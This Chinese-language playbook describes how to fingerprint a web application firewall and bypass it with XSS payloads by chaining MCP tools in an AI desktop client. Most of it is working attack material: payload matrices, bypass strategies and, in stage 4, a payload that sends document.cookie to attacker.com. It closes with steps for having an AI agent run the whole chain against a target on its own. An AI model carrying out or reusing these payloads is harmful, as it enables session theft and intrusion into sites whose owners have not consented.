# WAF 指纹识别与绕过 — MCP 攻防流程

> 所需 MCP: Sequential Thinking, HTTP Fetch, Playwright, Memory, Filesystem

---

## 概述

本流程使用 Sequential Thinking MCP 自动规划多步 WAF 绕过链，
结合 HTTP Fetch MCP 发送变形 payload，Playwright MCP 验证结果，
Memory MCP 学习 WAF 行为模式。

---

## 阶段 1: Sequential Thinking 自动拆解

Sequential Thinking MCP 会生成以下推理链：

```
Thought 1: 目标 URL 有搜索参数 q，需要确定WAF存在性
  → HTTP GET /search?q=test

Thought 2: 响应中 <script> 被拦截，确认存在 WAF
  → HTTP GET /search?q=<script>alert(1)</script>
  → Response: 403 / blocked

Thought 3: 尝试注释 bypass
  → HTTP GET /search?q=<scr<script>ipt>alert(1)</scr</script>ipt>

Thought 4: 尝试事件处理器绕过
  → HTTP GET /search?q=<img src=x onerror=alert(1)>

Thought 5: 尝试编码绕过
  → HTTP GET /search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E

Thought 6: 分析哪种绕过生效 → 选择最佳策略
  → Memory MCP 记录 WAF 行为特征
```

---

## 阶段 2: 自动 WAF 指纹学习 (HTTP + Memory)

**HTTP Fetch 发送探测矩阵:**

```json
{
  "method": "GET",
  "url": "https://target.com/search",
  "params": {
    "q": [
      "<script>alert(1)</script>",
      "<ScRiPt>alert(1)</ScRiPt>",
      "<scr<script>ipt>alert(1)</scr</script>ipt>",
      "<img src=x onerror=alert(1)>",
      "<svg onload=alert(1)>",
      "<details open ontoggle=alert(1)>",
      "%3Cscript%3Ealert(1)%3C/script%3E",
      "doubleurl%253Cscript%253Ealert(1)%253C/script%253E"
    ]
  }
}
```

**Memory MCP 记录结果:**

```json
[
  {"action": "add", "entity": "target.com", "attribute": "waf_blocks_script_tag", "value": "true"},
  {"action": "add", "entity": "target.com", "attribute": "waf_blocks_onerror", "value": "true"},
  {"action": "add", "entity": "target.com", "attribute": "waf_allows_svg", "value": "true"},
  {"action": "add", "entity": "target.com", "attribute": "waf_blocks_double_encode", "value": "false"}
]
```

---

## 阶段 3: 绕过策略生成 (Sequential Thinking)

基于 Memory 中的 WAF 指纹，Sequential Thinking 自动选择策略:

```
已知: WAF 拦截 <script>, onerror; 放行 SVG, onload
策略: SVG onload 绕过
  → <svg onload=alert(1)>
  → 概率: 高

已知: WAF 拦截关键字; 不拦截大小写变体
策略: 大小写混淆
  → <sCrIpT>alert(1)</sCrIpT>
  → 概率: 中

已知: WAF 不解码双重 URL 编码
策略: 双重编码
  → %253Cscript%253Ealert(1)%253C%252Fscript%253E
  → 概率: 中
```

---

## 阶段 4: 多向量攻击执行 (HTTP + Playwright)

**HTTP Fetch:**
```json
{
  "method": "GET", 
  "url": "https://target.com/search?q=<svg onload=fetch('https://attacker.com/?'+document.cookie)>"
}
```

**Playwright 验证:**
```json
[
  {"action": "navigate", "url": "https://target.com/search?q=<svg onload=alert(1)>"},
  {"action": "screenshot", "path": "./results/waf-bypass-result.png"},
  {"action": "evaluate", "script": "!!window.alert"}
]
```

---

## 阶段 5: 结果归档 (Memory + Filesystem)

**Memory MCP 持久化:**
```json
{
  "action": "add", 
  "entity": "target.com", 
  "attribute": "waf_bypass_payloads", 
  "value": "svg_onload, details_ontoggle, base_uri_hijack"
}
```

**Filesystem MCP 写报告:**
```json
{
  "action": "write",
  "path": "./results/waf-recon-report.md",
  "content": "## WAF Recon Report\nTarget: target.com\nWAF Type: ModSecurity (fingerprinted)\nBypass Success: SVG onload\n..."
}
```

---

## MCP 工具调用对应表

| 攻防技术手段 | 对应的 MCP 工具调用 |
|-------------------|-------------------|
| 检测 WAF 类型 | HTTP Fetch GET + 分析响应 headers |
| 测试 SVG 绕过 | Playwright navigate + screenshot |
| 测试编码绕过 | HTTP Fetch 带编码参数 |
| CSP 策略分析 | HTTP Fetch 检查 Content-Security-Policy header |
| DOM XSS postMessage | Playwright evaluate + addEventListener |

---

## 使用方式

```
1. 在 Claude Desktop 中打开此文件
2. Sequential Thinking MCP 自动激活
3. 输入: "对 target.com 进行 WAF 指纹识别和 XSS 绕过"
4. MCP 工具链自动执行全流程
```
